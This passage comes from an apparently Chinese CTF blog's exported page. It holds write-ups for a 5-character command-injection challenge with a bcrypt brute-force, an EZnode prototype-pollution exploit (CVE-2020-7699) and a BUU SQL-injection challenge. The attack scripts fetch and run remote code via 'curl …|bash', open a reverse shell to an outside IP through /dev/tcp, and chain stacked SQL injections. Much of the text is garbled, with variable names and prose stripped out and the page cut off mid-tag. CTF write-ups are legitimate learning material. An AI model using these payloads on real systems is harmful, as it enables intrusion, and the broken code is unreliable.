class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>,<span class=\"string\">''</span>);</span><br><span class=\"line\">$ = <span class=\"keyword\">array</span>($,$,$,$,$,$,$,$);</span><br><span class=\"line\">$ = <span class=\"string\">\"strlen\"</span>;</span><br><span class=\"line\">$ = <span class=\"string\">\"chr\"</span>;</span><br><span class=\"line\">$ = <span class=\"string\">\"base64_decode\"</span>;</span><br><span class=\"line\">$ = <span class=\"string\">\"isset\"</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $,$,$,$,$;</span><br><span class=\"line\">\t$= (<span class=\"string\">\"$\"</span>)($)/<span class=\"number\">4</span>;</span><br><span class=\"line\">\t$ = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ($ = <span class=\"number\">0</span>;$&lt;$;$++) &#123;</span><br><span class=\"line\">\t\t$ =$[$*<span class=\"number\">4</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">1</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">2</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t$ =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$ =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($ =<span class=\"number\">0</span>;$&lt;<span class=\"number\">8</span>;$++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ($=<span class=\"number\">0</span>;$&lt;<span class=\"number\">16</span>;$++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($ == $[$][$]) &#123;</span><br><span class=\"line\">\t\t\t\t\t$=$;</span><br><span class=\"line\">\t\t\t\t\t$ = $;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$ = $*<span class=\"number\">16</span>+$;</span><br><span class=\"line\">\t\t$ = $.(<span class=\"string\">\"$\"</span>)($);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"string\">\"$\"</span>)($);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $,$,$,$,$;</span><br><span class=\"line\">\t$ = ().()($_SERVER[()]);</span><br><span class=\"line\">\t()($);</span><br><span class=\"line\">\t()($);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[()]) &amp;&amp; ($)($_GET[()]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@()($_GET[()]);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[()])) &#123;</span><br><span class=\"line\">\t\t@()(() . $);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ = <span class=\"keyword\">new</span> Bcrypt();</span><br><span class=\"line\">$ = $_POST[()];</span><br><span class=\"line\">$ = ();</span><br><span class=\"line\"><span class=\"keyword\">if</span>($-&gt;verify($, $)) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(());</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(());</span><br><span class=\"line\">\t();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span>(());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><strong></strong></p>\n<p></p>\n<p></p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png\" alt=\"image-20200929221307190\"></p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">($)</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"\"</span>.$;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $,$,$,$,$;</span><br><span class=\"line\">\t$= (<span class=\"string\">\"$\"</span>)($)/<span class=\"number\">4</span>;</span><br><span class=\"line\">\t$ = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ($ = <span class=\"number\">0</span>;$&lt;$;$++) &#123;</span><br><span class=\"line\">\t\t$ =$[$*<span class=\"number\">4</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">1</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">2</span>].$[$*<span class=\"number\">4</span>+<span class=\"number\">3</span>];</span><br><span class=\"line\">\t\t$ =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t$ =<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> ($ =<span class=\"number\">0</span>;$&lt;<span class=\"number\">8</span>;$++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> ($=<span class=\"number\">0</span>;$&lt;<span class=\"number\">16</span>;$++) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>($ == $[$][$]) &#123;</span><br><span class=\"line\">\t\t\t\t\t$=$;</span><br><span class=\"line\">\t\t\t\t\t$ = $;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t$ = $*<span class=\"number\">16</span>+$;</span><br><span class=\"line\">\t\t$ = $.(<span class=\"string\">\"$\"</span>)($);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"\"</span>.(<span class=\"string\">\"$\"</span>)($);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (<span class=\"string\">\"$\"</span>)($);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $,$strlen,$chr,$base64_decode,$isset;</span><br><span class=\"line\">\t$path = <span class=\"string\">\"/var/www/html/sandbox/\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">\tmkdir($path);</span><br><span class=\"line\">\tchdir($path);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">\t\t@exec(<span class=\"string\">\"rm -rf\"</span> . $path);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ = <span class=\"keyword\">new</span> Bcrypt();</span><br><span class=\"line\"></span><br><span class=\"line\">$ = $_POST[<span class=\"string\">\"passwd\"</span>];</span><br><span class=\"line\">$ = <span class=\"string\">\"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>($-&gt;verify($passwd, $lock)) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Password verified!\"</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"Wow!!Now,hack it!\"</span>;</span><br><span class=\"line\">\t();</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;Password not match!&lt;/br&gt;\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>composerbcrypt</p>\n<h3 id=\"bcrypt\"><a href=\"#bcrypt\" class=\"headerlink\" title=\"bcrypt\"></a>bcrypt</h3><p><code>bcrypt</code></p>\n<p><strong><code>bcrypt</code></strong><strong></strong></p>\n<blockquote>\n<p></p>\n<p></p>\n</blockquote>\n<p>php<code>password_hash</code><code>password_verify</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = password_hash(<span class=\"string\">'password'</span>,PASSWORD_DEFAULT);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $a.<span class=\"string\">\"&lt;br&gt;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(password_verify(<span class=\"string\">'password'</span>,$a))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"success\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"failed\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(password_get_info($a));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">array</span> (size=<span class=\"number\">3</span>)</span><br><span class=\"line\">  <span class=\"string\">'algo'</span> =&gt; int <span class=\"number\">1</span></span><br><span class=\"line\">  <span class=\"string\">'algoName'</span> =&gt; string <span class=\"string\">'bcrypt'</span> (length=<span class=\"number\">6</span>)</span><br><span class=\"line\">  <span class=\"string\">'options'</span> =&gt; </span><br><span class=\"line\">    <span class=\"keyword\">array</span> (size=<span class=\"number\">1</span>)</span><br><span class=\"line\">      <span class=\"string\">'cost'</span> =&gt; int <span class=\"number\">10</span></span><br><span class=\"line\">$a = password_hash(<span class=\"string\">'password'</span>,PASSWORD_DEFAULT,<span class=\"keyword\">array</span>(<span class=\"string\">'cost'</span> =&gt; <span class=\"number\">11</span>));</span><br><span class=\"line\"><span class=\"comment\">//cost11</span></span><br></pre></td></tr></table></figure>\n<p>bcrypt+4</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>; </span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Bcrypt</span>\\<span class=\"title\">Bcrypt</span>; </span><br><span class=\"line\">$key = <span class=\"string\">\"abcdefghijklmnopqrstuvwxyz\"</span>; </span><br><span class=\"line\">$bcrypt = <span class=\"keyword\">new</span> Bcrypt(); </span><br><span class=\"line\">$plaintext = <span class=\"string\">'bcrypt'</span>;<span class=\"comment\">//bcryptyyds </span></span><br><span class=\"line\">$ciphertext = <span class=\"string\">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">26</span>;$i++) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">for</span>($j=<span class=\"number\">0</span>;$j&lt;<span class=\"number\">26</span>;$j++) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">for</span>($k=<span class=\"number\">0</span>;$k&lt;<span class=\"number\">26</span>;$k++) &#123; </span><br><span class=\"line\">            <span class=\"keyword\">for</span>($m=<span class=\"number\">0</span>;$m&lt;<span class=\"number\">26</span>;$m++) &#123; </span><br><span class=\"line\">                <span class=\"keyword\">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class=\"line\">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class=\"line\">                <span class=\"keyword\">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span>(<span class=\"string\">\"&lt;/br&gt;Password verified!&lt;/br&gt;\"</span>); </span><br><span class=\"line\">                    <span class=\"keyword\">echo</span>(<span class=\"string\">\"Wow!!Now,hack it!&lt;/br&gt;\"</span>); </span><br><span class=\"line\">                &#125; </span><br><span class=\"line\">            &#125; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>hitcon-ctf-2017</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> $,$strlen,$chr,$base64_decode,$isset;</span><br><span class=\"line\">\t$path = <span class=\"string\">\"/var/www/html/sandbox/\"</span>.md5($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">\tmkdir($path);</span><br><span class=\"line\">\tchdir($path);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">\t\t@exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">\t\t<span class=\"comment\">//</span></span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">\t\t@exec(<span class=\"string\">\"rm -rf\"</span> . $path);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>5linuxshellcurl ip|bashshellshell</p>\n<p></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\">url = <span class=\"string\">\"http://219.219.61.234:10048/?cmd=\"</span></span><br><span class=\"line\">payload = [</span><br><span class=\"line\">    <span class=\"comment\"># generate \"g&gt; ht- sl\" to file \"v\"</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;dir'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;sl'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;g\\&gt;'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;ht-'</span>,</span><br><span class=\"line\">    <span class=\"string\">'*&gt;v'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" '</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;rev'</span>,</span><br><span class=\"line\">    <span class=\"string\">'*v&gt;x'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># generate \"curl 0X2761697D|bash\"</span></span><br><span class=\"line\">    <span class=\"string\">'&gt;sh '</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;ba\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\|\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;7D\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;69\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;61\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;27\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;0X\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;\\ \\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;rl\\\\'</span>,</span><br><span class=\"line\">    <span class=\"string\">'&gt;cu\\\\'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># got shell</span></span><br><span class=\"line\">    <span class=\"string\">'sh x'</span>,</span><br><span class=\"line\">    <span class=\"string\">'sh g'</span>,</span><br><span class=\"line\">]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> len(i) &lt;= <span class=\"number\">5</span></span><br><span class=\"line\">    data = &#123; <span class=\"string\">'passwd'</span>:<span class=\"string\">'bcryptyyds'</span>, &#125;</span><br><span class=\"line\">    header = &#123; <span class=\"string\">\"Content-Type\"</span> : <span class=\"string\">\"application/x-www-form-urlencoded\"</span>,</span><br><span class=\"line\">               <span class=\"string\">\"Accept\"</span> : <span class=\"string\">\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\"</span>,</span><br><span class=\"line\">               <span class=\"string\">\"Upgrade-Insecure-Requests\"</span> : <span class=\"string\">\"1\"</span> &#125;</span><br><span class=\"line\">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class=\"line\">    print(i)</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br></pre></td></tr></table></figure>\n<p></p>\n<h2 id=\"EZnode\"><a href=\"#EZnode\" class=\"headerlink\" title=\"EZnode\"></a>EZnode</h2><p></p>\n<h3 id=\"-3\"><a href=\"#-3\" class=\"headerlink\" title=\"\"></a></h3><p>nginx</p>\n<p>ngnix</p>\n<h3 id=\"ngnix\"><a href=\"#ngnix\" class=\"headerlink\" title=\"ngnix\"></a>ngnix</h3><p>ngnixHTTP</p>\n<p></p>\n<ul>\n<li></li>\n<li></li>\n<li>nginx</li>\n</ul>\n<p><strong></strong></p>\n<blockquote>\n<p></p>\n<p></p>\n</blockquote>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png\" alt=\"image-20201004160128766\"></p>\n<p></p>\n<p>nginx</p>\n<p></p>\n<p>~nginx</p>\n<p><strong></strong></p>\n<p></p>\n<p></p>\n<p><strong>ngnix</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main                                # </span><br><span class=\"line\"> </span><br><span class=\"line\">events &#123;                            # nginx</span><br><span class=\"line\"> </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">http &#123;                                # http</span><br><span class=\"line\">    ....</span><br><span class=\"line\"> </span><br><span class=\"line\">    server &#123;                        # </span><br><span class=\"line\">        ....</span><br><span class=\"line\">        location &#123;                    # </span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        location path &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        location otherpath &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    server &#123;</span><br><span class=\"line\">        ....</span><br><span class=\"line\"> </span><br><span class=\"line\">        location &#123;</span><br><span class=\"line\">            ....</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    upstream name &#123;                    # </span><br><span class=\"line\">        ....</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>\n<p>/static../</p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png\" alt=\"image-20201004162700298\"></p>\n<p>cve</p>\n<p>cve-2020-7699</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">cmd = <span class=\"string\">'bash -c \"bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1\"'</span></span><br><span class=\"line\"><span class=\"comment\"># pollute</span></span><br><span class=\"line\">r1 = requests.post(<span class=\"string\">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class=\"string\">'__proto__.outputFunctionName'</span>: (</span><br><span class=\"line\">    <span class=\"literal\">None</span>, <span class=\"string\">\"x;process.mainModule.require('child_process').exec('&#123;&#125;');x\"</span>.format(cmd))&#125;)</span><br><span class=\"line\">print(r1.text)</span><br><span class=\"line\"><span class=\"comment\"># execute command</span></span><br><span class=\"line\">r2 = requests.get(<span class=\"string\">'http://219.219.61.234:20006/'</span>)</span><br><span class=\"line\">print(r2.text)</span><br></pre></td></tr></table></figure>\n<p>shell</p>\n","categories":["CTF"],"tags":["WP"]},{"title":"BUU(Web)","url":"https://pz1o.top/2020/09/27/BUU/","content":"<a id=\"more\"></a>\n<h1 id=\"BUU-Web\"><a href=\"#BUU-Web\" class=\"headerlink\" title=\"BUU(Web)\"></a>BUU(Web)</h1><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p>wp</p>\n<p></p>\n<h1 id=\"SQL\"><a href=\"#SQL\" class=\"headerlink\" title=\"SQL\"></a>SQL</h1><h2 id=\"-2019-\"><a href=\"#-2019-\" class=\"headerlink\" title=\"[ 2019]\"></a>[ 2019]</h2><blockquote>\n<p></p>\n<p>sqlsql</p>\n</blockquote>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39; #</span><br><span class=\"line\">1&#39; order by 2#</span><br><span class=\"line\">1&#39; union select 1,2#</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823154827319.png\" alt=\"image-20200823154827319\"></p>\n<p>showalertrenamedesc</p>\n<p></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;desc words;#</span><br></pre></td></tr></table></figure>\n<p>words</p>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823155250757.png\" alt=\"image-20200823155250757\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;desc &#96;1919810931114514&#96;;#  &#x2F;&#x2F;mysql&#96;&#96;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823180812053.png\" alt=\"image-20200823180812053\"></p>\n<p>flagflag</p>\n<p></p>\n<p>flagidwordsflag</p>\n<ul>\n<li>wordswords</li>\n<li>wordsididflag</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select id,data from words where id&#x3D;&#39;id&#39;;</span><br></pre></td></tr></table></figure>\n<p>flagdata</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>\n<p><img 